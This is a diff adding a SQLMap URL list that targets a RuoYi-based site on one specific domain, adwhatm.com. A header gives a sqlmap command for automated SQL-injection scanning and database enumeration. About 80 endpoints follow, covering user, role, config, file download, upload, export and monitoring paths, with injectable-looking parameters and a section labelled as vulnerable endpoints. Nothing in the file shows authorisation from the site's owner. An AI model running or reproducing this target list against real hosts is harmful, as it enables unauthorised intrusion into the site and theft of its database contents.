@@ -1,0 +1,101 @@
+# SQLMap URL List for RuoYi Framework Testing
+# Usage: sqlmap -m sqlmap-urls.txt --batch --dbs
+
+# Authentication Endpoints
+http://adwhatm.com/login
+http://adwhatm.com/register
+
+# Main System Management URLs
+http://adwhatm.com/system/user/list
+http://adwhatm.com/system/user/list?id=1
+http://adwhatm.com/system/user/edit/1
+http://adwhatm.com/system/user/detail/1
+http://adwhatm.com/system/user/remove?ids=1
+
+# Role Management
+http://adwhatm.com/system/role/list
+http://adwhatm.com/system/role/list?id=1
+http://adwhatm.com/system/role/edit/1
+http://adwhatm.com/system/role/detail/1
+
+# Department Management
+http://adwhatm.com/system/dept/list
+http://adwhatm.com/system/dept/list?id=1
+http://adwhatm.com/system/dept/edit/1
+http://adwhatm.com/system/dept/detail/1
+
+# Menu Management
+http://adwhatm.com/system/menu/list
+http://adwhatm.com/system/menu/list?id=1
+http://adwhatm.com/system/menu/edit/1
+http://adwhatm.com/system/menu/detail/1
+
+# Dictionary Management
+http://adwhatm.com/system/dict/data/list
+http://adwhatm.com/system/dict/type/list
+http://adwhatm.com/system/dict/data/list?dictType=sys_user_sex
+
+# Configuration Management
+http://adwhatm.com/system/config/list
+http://adwhatm.com/system/config/list?id=1
+http://adwhatm.com/system/config/edit/1
+
+# Notice Management
+http://adwhatm.com/system/notice/list
+http://adwhatm.com/system/notice/list?id=1
+http://adwhatm.com/system/notice/edit/1
+
+# Log Management
+http://adwhatm.com/monitor/operlog/list
+http://adwhatm.com/monitor/logininfor/list
+http://adwhatm.com/system/operlog/list
+http://adwhatm.com/system/logininfor/list
+
+# File Management
+http://adwhatm.com/common/download?fileName=test.txt
+http://adwhatm.com/upload
+http://adwhatm.com/download
+
+# Search with Parameters (High Priority)
+http://adwhatm.com/system/user/list?searchValue=admin
+http://adwhatm.com/system/user/list?orderByColumn=user_id
+http://adwhatm.com/system/user/list?pageNum=1&pageSize=10
+
+# API Endpoints
+http://adwhatm.com/system/user/export
+http://adwhatm.com/system/user/importData
+http://adwhatm.com/system/user/importTemplate
+
+# Monitoring Endpoints
+http://adwhatm.com/monitor/server
+http://adwhatm.com/monitor/cache
+http://adwhatm.com/monitor/online/list
+
+# Tool Endpoints
+http://adwhatm.com/tool/gen/list
+http://adwhatm.com/tool/build/list
+
+# Profile Management
+http://adwhatm.com/system/user/profile
+http://adwhatm.com/system/user/profile/updatePwd
+
+# Common RuoYi Vulnerable Endpoints
+http://adwhatm.com/system/post/list
+http://adwhatm.com/system/post/list?id=1
+http://adwhatm.com/system/post/edit/1
+
+# Job Management (if exists)
+http://adwhatm.com/monitor/job/list
+http://adwhatm.com/monitor/job/list?id=1
+
+# Additional Parameter Testing
+http://adwhatm.com/system/user/list?userId=1
+http://adwhatm.com/system/user/list?deptId=1
+http://adwhatm.com/system/user/list?roleId=1
+http://adwhatm.com/system/user/list?status=1
+
+# Potential Custom Endpoints
+http://adwhatm.com/business/user/list
+http://adwhatm.com/custom/data/list
+http://adwhatm.com/api/user/list
+http://adwhatm.com/admin/user/list
